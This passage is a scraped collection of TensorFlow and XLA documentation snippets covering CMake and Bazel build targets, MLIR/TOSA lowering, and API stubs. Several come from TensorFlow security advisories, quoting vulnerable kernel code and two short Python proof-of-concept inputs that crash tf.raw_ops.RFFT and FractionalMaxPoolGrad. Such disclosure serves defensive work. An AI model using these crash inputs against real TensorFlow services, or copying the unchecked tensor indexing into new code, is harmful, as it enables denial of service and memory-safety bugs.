  }
  attr {
    key: "f"
    value {
      func {
        name: "__inference__traced_restore_57"
      }
    }
  }
}
```

----------------------------------------

TITLE: Getting Root AudioProperties (Deprecated) in Python
DESCRIPTION: Retrieves the root `AudioProperties` object from a FlatBuffers buffer. This class method serves the same purpose as `GetRootAs` but is deprecated and should be avoided in new code. It takes the buffer and an optional offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioProperties.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsAudioProperties(
    buf, offset=0
)
```

----------------------------------------

TITLE: Defining TensorFlow Shard API Function Signature - C++
DESCRIPTION: This snippet shows the expected signature for the work function parameter in the TensorFlow `Shard` API. It requires a `std::function` taking two `int64` arguments, defining how the parallel work units are processed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-014.md#_snippet_0

LANGUAGE: C++
CODE:
```
void Shard(int max_parallelism, thread::ThreadPool* workers, int64 total,
           int64 cost_per_unit, std::function<void(int64, int64)> work);
```

----------------------------------------

TITLE: Configuring Flatc Build with CMake
DESCRIPTION: This CMake script initializes the project to build the `flatc` compiler using C and C++. It incorporates TensorFlow Lite's specific CMake modules for build configuration, determines and sets the installation prefix for the compiled binary, and locates the necessary FlatBuffers library dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/native_tools/flatbuffers/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
#
# Copyright 2021 The TensorFlow Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Builds the flatc compiler separately (e.g. for the purposes of TF Lite kernel tests cross-compilation
# during which a natively compiled 'flatc' binary is required.

cmake_minimum_required(VERSION 3.16)
project(flatc C CXX)

# Incorporate the tflite CMake modules into the CMAKE_MODULE_PATH
get_filename_component(TFLITE_NATIVE_TOOLS_DIR ${CMAKE_CURRENT_SOURCE_DIR} DIRECTORY)
get_filename_component(TFLITE_CMAKE_DIR ${TFLITE_NATIVE_TOOLS_DIR} DIRECTORY)
set(TFLITE_CMAKE_MODULE_PATH ${TFLITE_CMAKE_DIR}/modules)

list(APPEND CMAKE_MODULE_PATH ${TFLITE_CMAKE_MODULE_PATH})
list(APPEND CMAKE_PREFIX_PATH ${TFLITE_CMAKE_MODULE_PATH})

include(OverridableFetchContent)

set(FLATC_EXCLUDE_FROM_ALL FALSE)

# Install location of a (native) flatc compiler might be determined using the CMAKE_INSTALL_PREFIX variable.
# If the user provides such location, the path gets cached during the first CMake run and used later
# (for details see flatbuffers.cmake configuration).
if(CMAKE_INSTALL_PREFIX_INITIALIZED_TO_DEFAULT)
  set(FLATC_INSTALL_PREFIX <INSTALL_DIR> CACHE PATH "Flatc installation directory")
else()
  set(FLATC_INSTALL_PREFIX ${CMAKE_INSTALL_PREFIX} CACHE PATH "Flatc installation directory")
endif()

find_package(FlatBuffers)
```

----------------------------------------

TITLE: Regenerating TensorFlow XLA Supported Ops List - Shell
DESCRIPTION: This command executes a Bazel target to run the TensorFlow XLA supported operations tool, generating the list of operations compatible with the XLA compiler for a specific device (XLA_CPU_JIT in this case). It requires a Bazel build environment configured for the TensorFlow project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/tf2xla/g3doc/cpu_supported_ops.md#_snippet_0

LANGUAGE: shell
CODE:
```
bazel run -c opt -- tensorflow/compiler/tf2xla:tf2xla_supported_ops --device=XLA_CPU_JIT
```

----------------------------------------

TITLE: Accessing Input Tensors in TensorFlow QuantizedMul Kernel (C++)
DESCRIPTION: This C++ code snippet shows the problematic section in the TensorFlow `QuantizedMul` kernel implementation. It directly accesses the first element (`(0)`) of the input tensors for `min_x`, `max_x`, `min_y`, and `max_y` using `.flat<float>()`. This assumes these tensors are non-empty scalars, causing a heap buffer overflow if an empty tensor is provided, as `.flat<T>()` would return an empty buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-023.md#_snippet_1

LANGUAGE: c++
CODE:
```
const float min_x = context->input(2).flat<float>()(0);
const float max_x = context->input(3).flat<float>()(0);
const float min_y = context->input(4).flat<float>()(0);
const float max_y = context->input(5).flat<float>()(0);
```

----------------------------------------

TITLE: Vulnerable Shape Access in TensorFlow Kernel C++
DESCRIPTION: This C++ code snippet shows the specific line within the `ParameterizedTruncatedNormal` kernel implementation that is vulnerable. It attempts to access the first element (index 0) of the `shape_tensor`'s flattened representation. If the `shape_tensor` is empty, this access is out-of-bounds, causing the null pointer binding issue described in the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-055.md#_snippet_1

LANGUAGE: C++
CODE:
```
int32 num_batches = shape_tensor.flat<int32>()(0);
```

----------------------------------------

TITLE: Resource Constructor Showing Vulnerable Integer Usage - C++
DESCRIPTION: This C++ snippet shows the constructor for the `BoostedTreesQuantileStreamResource` class within the TensorFlow core. It highlights the use of the `num_streams_` member, initialized from a signed `int64`, directly within the `streams_.reserve()` call. The vulnerability occurs because `reserve` expects an unsigned integer, and a negative value in `num_streams_` results in a large, incorrect allocation size after the implicit signed-to-unsigned conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-135.md#_snippet_1

LANGUAGE: c++
CODE:
```
class BoostedTreesQuantileStreamResource : public ResourceBase {
 public:
  BoostedTreesQuantileStreamResource(const float epsilon,
                                     const int64 max_elements,
                                     const int64 num_streams)
      : are_buckets_ready_(false),
        epsilon_(epsilon),
        num_streams_(num_streams),
        max_elements_(max_elements) {
    streams_.reserve(num_streams_);
    ...
  }
}
```

----------------------------------------

TITLE: Run Model Training Script (Shell)
DESCRIPTION: This snippet shows a placeholder command example for executing the model training script. Users should replace '...' with the actual script path and necessary command-line arguments for training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/Winner_OSS_Template.md#_snippet_1

LANGUAGE: shell
CODE:
```
python3 ...
```

----------------------------------------

TITLE: Listing TensorFlow Component Names - Python
DESCRIPTION: Lists specific TensorFlow component names, including `tf.TestDummySaver` and `tf.TPUEmbeddingCallback`. This list is likely used for registering these components within a TensorFlow framework or related tool, enabling their use by name during model saving or training callback processes. These lines are simple Python expressions referencing the classes/objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/registration/tf_checkpoint_saver_allowlist.txt#_snippet_0

LANGUAGE: python
CODE:
```
tf.TestDummySaver
tf.TPUEmbeddingCallback
```

----------------------------------------

TITLE: Define MLIR Mhlo Utility Library Target (Bazel BUILD)
DESCRIPTION: This snippet defines a build target named `MLIRMhloUtils` using the `add_mlir_dialect_library` rule. It lists the C++ source files (`.cc`) included in this library and specifies the public libraries it links against, such as other MLIR dialects and support libraries. This rule is processed by the Bazel build system to compile and link the library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/utils/CMakeLists.txt#_snippet_0

LANGUAGE: Bazel BUILD
CODE:
```
add_mlir_dialect_library(MLIRMhloUtils
  codegen_utils.cc
  convert_op_folder.cc
  cycle_detector.cc
  hlo_utils.cc

  LINK_LIBS PUBLIC
  ChloOps
  MLIRArithDialect
  MLIRFuncDialect
  MLIRIR
  MLIRLLVMDialect
  MLIRMemRefDialect
  MLIRPass
  MLIRShapeDialect
  MLIRSupport
  )
```

----------------------------------------

TITLE: Defining MHLO Pass Tablegen Source (CMake)
DESCRIPTION: Sets the CMake variable LLVM_TARGET_DEFINITIONS to point to the mhlo_passes.td file. This file is used by the MLIR tablegen tool to generate code related to MHLO passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
set(LLVM_TARGET_DEFINITIONS mhlo_passes.td)
```

----------------------------------------

TITLE: Verify Unsigned Integer Remainder Optimization - LLVM IR
DESCRIPTION: This LLVM IR code is used with Alive2 to verify the safety of optimizing an unsigned integer remainder (`urem`) operation when it's surrounded by upcasting and downcasting. It compares a source function with zero-extension (`zext`), remainder, and truncation (`trunc`) against a target function with a direct remainder. The verification suggests this transformation is safe for unsigned remainder but not for signed remainder. Input: two i8 unsigned integers. Output: an i8 unsigned integer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/service/algebraic_simplifier_alive2_proofs.md#_snippet_2

LANGUAGE: LLVM IR
CODE:
```
define i8 @src(i8, i8) {
  %cast1 = zext i8 %0 to i16
  %cast2 = zext i8 %1 to i16
  %sum = urem i16 %cast1, %cast2
  %trunc = trunc i16 %sum to i8
  ret i8 %trunc
}

define i8 @tgt(i8, i8) {
  %r = urem i8 %0, %1
  ret i8 %r
}
```

----------------------------------------

TITLE: Generating MLIR Pass Declarations with TableGen (CMake)
DESCRIPTION: Executes the `mlir_tablegen` utility to generate C++ header code (`passes.h.inc`) containing declarations for MLIR passes. The `-gen-pass-decls` argument specifies the generation mode, and `-name Deallocation` sets the name used in the generated code, typically for a namespace or class related to deallocation passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/deallocation/transforms/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
mlir_tablegen(passes.h.inc -gen-pass-decls -name Deallocation)
```

----------------------------------------

TITLE: Defining ReduceWindow Operation in MLIR HLO
DESCRIPTION: Defines an XLA ReduceWindow operation on a 2D floating-point parameter (`p0`) using a constant initial value (`c_inf`) and a window size and padding configuration. It applies the `max` reduction function over the defined window.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_7

LANGUAGE: MLIR HLO
CODE:
```
c_inf = f32[] constant(-inf)
p0 = f32[1024, 514] parameter(0)
outpu = f32[1024, 3] reduce-window(p0, c_inf),
  window={size=1x512 pad=0_0x0_0}, to_apply=max
```

----------------------------------------

TITLE: Pinning Lit Dependency for Bazel Compatibility
DESCRIPTION: The `lit` dependency is pinned to version `17.0.2`. This specific version is required for compatibility when using Python 3.11 with Bazel 6, addressing a known issue (b/286090018).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_6

LANGUAGE: Python
CODE:
```
lit ~= 17.0.2
```

----------------------------------------

TITLE: Get Root FeatureProperties Object (Deprecated) in Python
DESCRIPTION: This class method, now deprecated, also retrieves the root `FeatureProperties` FlatBuffer object from a buffer. Users should switch to using the `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeatureProperties.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsFeatureProperties(
    buf, offset=0
)
```

----------------------------------------

TITLE: Running FileCheck Tests (Bazel/Shell)
DESCRIPTION: This Bazel command executes a specific FileCheck test target named `:foo.py.test`, typically used during the debugging process to verify output against expected patterns defined in a .test file. It initiates the test execution process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/tests/tf_saved_model/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel run :foo.py.test
```

----------------------------------------

TITLE: Lowering Generic Reduce (MLIR/TOSA IR)
DESCRIPTION: Lowers a generic Reduce operation (like Sum, Mean, etc.) to TOSA using a templated TOSA operator `tosa_op_t OP`. It handles the special case of no axes (identity), applies rescaling for quantized inputs/outputs, and uses the templated `tosa.OP` repeatedly for each axis. If `keep_dims` is false, a final reshape is applied.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_16

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_reduce_op<tosa_op_t OP>(Value %input, shape_t output_shape, Value %axes, bool keep_dims, float64 input_scale=1.0f, int32 input_zp=0, float64 output_scale=1.0f, int32 output_zp=0)
{

    vector axes_vec = %axes.as_constant();

    // Special case of no axes means no transformation
    if (axes_vec.size() == 0) {
       return tosa.IDENTITY(%input)
    }

    bool is_quantized = isa<QuantizedType>(%input.dtype) ? true : false;

    shape_t shape = %input.shape;
    %output = %input;

    if (is_quantized) {
        %output = tosa.RESCALE(%output) {scale=input_scale, input_zp=input_zp, output_zp=0}
    }

    for (int32 i = 0; i < axes_vec.size(); i++) {
        int32 axis = positive_axis(axes_vec[i], %input.rank);

        shape[axis] = 1;
        %output = tosa.OP(%output) {axis=axis}
    }

    if (!keep_dims) {
       %output = tosa.RESHAPE(%output) {new_shape=output_shape}
    }

    if (is_quantized) {
        %output = tosa.RESCALE(%output) {scale=output_scale, input_zp=0, output_zp=output_zp}
    }

    return %output;
}
```

----------------------------------------

TITLE: Lowering tf.Transpose to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.Transpose` operation, which shuffles tensor dimensions according to a permutation, to the TOSA dialect's `tosa.TRANSPOSE` operation. It requires the permutation `perm` as a constant attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_46

LANGUAGE: MLIR
CODE:
```
%output = tf.Transpose(%x, %perm)
```

LANGUAGE: MLIR
CODE:
```
%output = tosa.TRANSPOSE(%x) {perm=%perm.as_constant()}
```

----------------------------------------

TITLE: Iterating through Eager Runtime Outputs C++
DESCRIPTION: This C++ snippet from TensorFlow's eager runtime (`kernel_and_device.cc`) shows how outputs are collected after an operation. It iterates through the outputs and attempts to dereference and copy each tensor, leading to a segmentation fault if an output pointer is `nullptr`, which is the root cause of the vulnerability described.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-026.md#_snippet_0

LANGUAGE: C++
CODE:
```
  if (outputs != nullptr) {
    outputs->clear();
    for (int i = 0; i < context.num_outputs(); ++i) {
      outputs->push_back(Tensor(*context.mutable_output(i)));
    }
  }
```

----------------------------------------

TITLE: Saving Vocabulary in AverageWordVecSpec
DESCRIPTION: Saves the generated vocabulary list to a specified file path. This allows the vocabulary to be reused later for loading or for preprocessing new data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_10

LANGUAGE: python
CODE:
```
save_vocab(
    vocab_filename
)
```

----------------------------------------

TITLE: Calculating Transpose Conv2d Padding (MLIR Utility)
DESCRIPTION: This function calculates the padding values (pad_before, pad_after) for a transposed convolution (Conv2dTranspose) operation based on the requested padding type (e.g., TensorFlow's VALID or SAME), data format, filter dimensions, input/filter types, strides, and dilations. It determines the required padding to achieve the target output size based on effective filter size and stride.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_29

LANGUAGE: MLIR
CODE:
```
vector<int64> get_transpose_conv2d_padding_values_from_pad_type(tensorflow::Padding padding, tensorflow::TensorFormat data_format,
                                                         uint32 first_filter_spatial_dim, type input_type, type filter_type,
                                                         vector strides, vector dilations)
{
    int64 pad_before, pad_after;
    vector<int64> computed_padding;

    for (int32 i = 0; i < 2; i++) {
        int64 ifm_dim = GetTensorSpatialDimIndex(4, data_format, i);
        int64 ofm_dim = GetTensorSpatialDimIndex(4, data_format, i);
        int64 filter_dim = first_filter_spatial_dim + 1;

        int64 ifm_size = input_shape[ifm_dim];
        int64 ofm_size = output_dims[ofm_dim];
        int64 filter_size = filter.shape[filter_dim];
        int64 dim_dilation = dilations[i];
        int64 dim_stride = strides[i];
        int32 effective_filter_size = (filter_size - 1) * dim_dilation + 1;
        int32 total_padding = ((ifm_size - 1) * dim_stride + effective_filter_size - ofm_size);
        total_padding = total_padding > 0 ? total_padding : 0;

        pad_before = total_padding / 2;
        pad_after = total_padding - pad_before;

        computed_padding.push_back(pad_before);
    }

    return computed_padding;
}
```

----------------------------------------

TITLE: Adding MLIR GPU Transforms Library Target - CMake
DESCRIPTION: Defines a CMake target for building the `MLIRHLOGPUTransforms` library. It compiles the listed C++ source files containing GPU-specific passes, depends on the generated GPU pass declarations (`LMHLOGPUTransformsPassIncGen`), links against necessary MLIR dialects and transformation libraries, and requires the Core component.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
add_mlir_library(MLIRHLOGPUTransforms
  gpu_kernel_lowering_passes.cc
  gpu_passes.cc

  DEPENDS
  LMHLOGPUTransformsPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MLIRArithTransforms
  MLIRGPUDialect
  MLIRIR
  MLIRMemRefTransforms
  MLIRPass
  MLIRShapeDialect
  MLIRSCFTransforms
  MLIRTransforms
  MLIRVectorTransforms
)
```

----------------------------------------

TITLE: Initializing ContentT Object in Python
DESCRIPTION: Initializes a new instance of the ContentT class. This is the default constructor for creating a ContentT object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentT()
```

----------------------------------------

TITLE: Implementing Plugin Initialize Method Python
DESCRIPTION: Shows the required `initialize()` method implementation in the Python plugin module. This function registers the plugin with JAX using the private `jax._src.xla_bridge.register_plugin` method, providing the plugin name, shared library path, and priority.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_6

LANGUAGE: python
CODE:
```
import os
import jax._src.xla_bridge as xb

def initialize():
  path = os.path.join(os.path.dirname(__file__), 'my_plugin.so')
  xb.register_plugin('my_plugin', priority=500, library_path=path, options=None)
```

----------------------------------------

TITLE: C++ Structure for HLO IndexingMap
DESCRIPTION: This C++ code defines the `IndexingMap` class used in the implementation. It encapsulates an MLIR `AffineMap` along with vectors of `Variable` structs to store bounds for dimension, range, and runtime variables, and a map for additional expression constraints. This structure holds all the necessary information for a single indexing map.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_1

LANGUAGE: C++
CODE:
```
struct Interval {
 int64_t lower;
 int64_t upper;
};

class IndexingMap {
   // Variable represents dimension, range or runtime variable.
  struct Variable {
    Interval bounds;
    // Name of the variable is used for nicer printing.
    std::string name = "";
  };

  mlir::AffineMap affine_map_;

  // DimVars represent dimensions of a tensor or of a GPU grid.
  std::vector<Variable> dim_vars_;

  // RangeVars represent ranges of values, e.g. to compute a single element of
  // the reduction's result we need a range of values from the input tensor.
  std::vector<Variable> range_vars_;

  // RTVars represent runtime values, e.g. a dynamic offset in
  // HLO dynamic-update-slice op.
  std::vector<Variable> rt_vars_;
  llvm::DenseMap<mlir::AffineExpr, Interval> constraints_;
};
```

----------------------------------------

TITLE: Representing Instantiated TensorFlow Function Body with tfg.func (Concrete Types) - MLIR
DESCRIPTION: Shows the `tfg.func` representation for an instantiated TensorFlow function body. It uses concrete tensor types and demonstrates accessing multiple results by index (e.g., `%Switch#0`). The `tfg.return` operation acts as a required terminator for the function block.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_6

LANGUAGE: MLIR
CODE:
```
  tfg.func @foo(%arg0 : tensor<*xf32> {tfg.name = "input"},
                %arg1 : tensor<*xf32> {tfg.name = "another_input"})
      -> (tensor<*xi1> {tfg.name = "result1"},
          tensor<*xi1> {tfg.name = "result2"})
      attributes {description = "function foo"} {
    %Greater, %ctl_0 = tfg.Greater(%arg0, %arg1) [%arg1.ctl] name("Greater")
                          : (tensor<*xf32>, tensor<*xf32>) -> tensor<*xi1>
    %Switch:2, %ctl_1 = tfg.Switch(%Greater, %Greater) name("cond/Switch")
                          : (tensor<*xi1>, tensor<*xi1>) -> tensor<*xi1>
   tfg.return(%Switch#0, %Switch#1) [%ctl_0]
  }
```

----------------------------------------

TITLE: Test Python Dependencies (Non-Windows)
DESCRIPTION: Specifies Python packages required for running project tests, specifically on platforms other than Windows. Includes libraries for high-performance numerical computation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_mac.txt#_snippet_2

LANGUAGE: Python Requirements
CODE:
```
jax ~= 0.4.1
jaxlib ~= 0.4.1
```

----------------------------------------

TITLE: Getting Input Process Units Count in Python
DESCRIPTION: Retrieves the number of entries in the input process units list. This method returns the size of the input process units array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_12

LANGUAGE: python
CODE:
```
InputProcessUnitsLength()
```

----------------------------------------

TITLE: Running HLO Pass Tests with LIT and hlo-opt
DESCRIPTION: Shows how to write HLO pass tests using the LLVM LIT runner. The `// RUN:` line specifies the command to execute (`hlo-opt` with flags) piping the output to `FileCheck`. Interleaved `// CHECK-` directives validate specific patterns in the output, including platform-specific checks (`CHECK-PTX`, `CHECK-GCN`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/test_hlo_passes.md#_snippet_1

LANGUAGE: LIT
CODE:
```
// RUN: hlo-opt %s --platform=gpu --stage=llvm-before-optimizations --xla_gpu_target_config_filename=%S/../../../tools/hlo_opt/gpu_specs/%{GPU}.txtpb | FileCheck --check-prefixes=CHECK-%{PTX} %s

HloModule Test, is_scheduled=true
fused_computation {
  param_0 = f32[100,200]{1,0} parameter(0)
  ROOT b.1 = f32[200,100]{1,0} transpose(f32[100,200]{1,0} param_0), dimensions={1,0}
}
ENTRY main {
  a = f32[100, 200]{1,0} parameter(0)
  // CHECK-PTX:         call void @llvm.nvvm.barrier0
  // CHECK-GCN:         call void @llvm.amdgcn.s.barrier
  ROOT wrapped_b = f32[200,100]{1,0} fusion(f32[100,200]{1,0} a), kind=kInput, calls=fused_computation
}
```

----------------------------------------

TITLE: Defining MLIR-HLO Python Test Function (CMake)
DESCRIPTION: Defines a CMake function `add_mhlo_python_test` to create and configure a custom target for running a Python test script. The function takes the target name and script filename, sets the executable, working directory, dependencies on MLIR HLO Python modules, configures the PYTHONPATH environment, and adds the new test target as a dependency to the `check-mlir-hlo-python` aggregate target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/python/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
function(add_mhlo_python_test test_name file_name)
add_custom_target(${test_name}
  ${Python3_EXECUTABLE} ${file_name}
  WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}
  DEPENDS
    MLIRHLOPythonModules
)
set_target_properties(${test_name}
  PROPERTIES ENVIRONMENT
  "PYTHONPATH=${MLIR_HLO_BINARY_DIR}/python_packages/mlir_hlo/mlir:$ENV{PYTHONPATH}"
)
add_dependencies(check-mlir-hlo-python ${test_name})
endfunction()
```

----------------------------------------

TITLE: Checking dimension bounds with DCHECK in TensorFlow (C++)
DESCRIPTION: This C++ snippet shows the implementation of the `TensorShapeBase::dim_size` method, illustrating that it relies on `DCHECK_GE` and `DCHECK_LT` for bounds checking. In standard release builds, these `DCHECK`s are inactive macros, allowing out-of-bounds access to the `dims_` array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-027.md#_snippet_2

LANGUAGE: C++
CODE:
```
int64 TensorShapeBase<Shape>::dim_size(int d) const {
  DCHECK_GE(d, 0);
  DCHECK_LT(d, dims());
  DoStuffWith(dims_[d]);
}
```

----------------------------------------

TITLE: Creating Aggregate Test Target (CMake)
DESCRIPTION: Creates an empty custom target named `check-mlir-hlo-python`. This target acts as an aggregation point for individual Python test targets, allowing them to be run collectively by adding dependencies to this target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/python/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
add_custom_target(check-mlir-hlo-python)
```

----------------------------------------

TITLE: Demonstrating RFFT Vulnerability in TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates how to trigger a denial-of-service vulnerability in `tf.raw_ops.RFFT`. Providing a zero-length for the `fft_length` argument causes Eigen code to operate on an empty matrix, triggering an assertion failure and terminating the program.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-051.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([1], shape=[1], dtype=tf.float32)
fft_length = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.RFFT(input=inputs, fft_length=fft_length)
```

----------------------------------------

TITLE: Adding Dimension with Overflow Check in TensorFlow C++
DESCRIPTION: This C++ snippet from `tensor_shape.cc` shows the `AddDimWithStatus` function. It calculates the new number of elements (`new_num_elements`) by multiplying the current total with the size of the new dimension. It uses `MultiplyWithoutOverflow` and checks if the result is negative, returning an `errors::Internal` status in case of integer overflow, which is then caught by `InitDims` and subsequently the `CHECK` in the constructor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-012.md#_snippet_4

LANGUAGE: cpp
CODE:
```
template <class Shape>
Status TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {
  ...
  int64 new_num_elements;
  if (kIsPartial && (num_elements() < 0 || size < 0)) {
    new_num_elements = -1;
  } else {
    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);
    if (TF_PREDICT_FALSE(new_num_elements < 0)) {
        return errors::Internal("Encountered overflow when multiplying ",
                                num_elements(), " with ", size,
                                ", result: ", new_num_elements);
      }
  }
  ...
}
```

----------------------------------------

TITLE: Demonstrating FractionalMaxPoolGrad Heap OOB Crash (Python)
DESCRIPTION: This Python code snippet demonstrates how providing crafted outsize inputs `row_pooling_sequence` and `col_pooling_sequence` to the `tf.raw_ops.FractionMaxPoolGrad` operation can trigger a heap out-of-bounds vulnerability, resulting in a TensorFlow crash. It requires valid `orig_input`, `orig_output`, and `out_backprop` tensors to be provided alongside the malicious sequence values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-159.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.FractionMaxPoolGrad(
	orig_input = [[[[1, 1, 1, 1, 1]]]],
    orig_output = [[[[1, 1, 1]]]],
    out_backprop = [[[[3], [3], [6]]]],
    row_pooling_sequence = [-0x4000000, 1, 1], 
    col_pooling_sequence = [-0x4000000, 1, 1], 
    overlapping = False
 )
```

----------------------------------------

TITLE: Executing Bazel Compile Build (Bazel)
DESCRIPTION: This Bazel command performs the actual compilation step for the specified `test_targets`. It is used in compile-only testing scenarios within the CI workflows.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/readme.md#_snippet_2

LANGUAGE: Bazel
CODE:
```
bazel build ... test_targets
```

----------------------------------------

TITLE: Adding FFTSG3D Library Target CMake
DESCRIPTION: Defines the static library target `fft2d_fftsg3d` using its source file. It links this target to the `fft2d_fftsg` library and sets the source directory as a private include path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
add_library(fft2d_fftsg3d "${FFT2D_SOURCE_DIR}/fftsg3d.c")
target_link_libraries(fft2d_fftsg3d fft2d_fftsg)
target_include_directories(fft2d_fftsg3d PRIVATE "${FFT2D_SOURCE_DIR}")
```

----------------------------------------

TITLE: Accessing Input Tensor Data in QuantizedResizeBilinear (C++)
DESCRIPTION: This C++ snippet from the TensorFlow kernel implementation highlights the vulnerable code lines within `QuantizedResizeBilinear`. It attempts to access the first element (index 0) of the `min` and `max` input tensors after flattening them. The vulnerability occurs because this access is not protected against the case where the input tensors are empty, resulting in a heap buffer overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-025.md#_snippet_1

LANGUAGE: cpp
CODE:
```
const float in_min = context->input(2).flat<float>()(0);
const float in_max = context->input(3).flat<float>()(0);
```

----------------------------------------

TITLE: Initializating from Object (Python)
DESCRIPTION: Initializes the `ScoreCalibrationOptionsT` object from another existing `scoreCalibrationOptions` object. This class method is used for copying or transforming object instances. Requires the source object (`scoreCalibrationOptions`) of the same type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    scoreCalibrationOptions
)
```

----------------------------------------

TITLE: Input Example: TF Executor Graph with Islands (Functional Conversion)
DESCRIPTION: This MLIR snippet presents a function containing a `tf_executor.graph` with nested `tf_executor.island` operations enclosing TensorFlow operations. It serves as the input structure for the `-tf-executor-to-functional-conversion` pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_17

LANGUAGE: MLIR
CODE:
```
func @my_fn(%arg0: tensor<i32>, %arg1: tensor<i32>) -> (tensor<i32>, tensor<i32>) {
  %graph_results:2 = tf_executor.graph {
    %island_0_result, %island_0_control = tf_executor.island {
